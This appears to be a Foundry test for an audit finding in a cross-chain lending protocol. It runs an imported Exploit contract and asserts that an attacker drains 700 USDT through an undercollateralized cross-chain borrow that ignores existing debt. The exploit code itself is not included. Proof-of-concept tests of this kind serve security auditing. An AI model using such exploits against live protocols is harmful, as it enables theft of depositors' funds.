// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "./58375-lend-cross-chain-borrow-ignores-existing-debt-in-collateral-validation.sol";

contract Finding58375Test is Test {
    function testFinding58375() public {
        Exploit e = new Exploit();
        vm.deal(address(e), 1 ether);
        e.run{value: 1 ether}();

        emit log_named_uint("available capacity (correct)", e.availableCapacity());
        emit log_named_uint("cross-chain USDT received", e.crossChainReceived());
        emit log_named_uint("destination pool drained", e.dstPoolDrained());
        emit log_named_uint("attacker profit (USDT)", e.profit());

        // A correct check would have blocked the cross-chain borrow.
        assertLt(e.availableCapacity(), 700e18, "capacity should be below the borrow");
        assertEq(e.availableCapacity(), 200e18, "remaining capacity is only $200");
        // The bug let the attacker borrow the full 700 USDT against the same collateral.
        assertEq(e.crossChainReceived(), 700e18, "attacker received the undercollateralized borrow");
        assertEq(e.dstPoolDrained(), 700e18, "destination liquidity drained");
        assertEq(e.profit(), 700e18, "profit == illegitimate cross-chain borrow");
    }
}
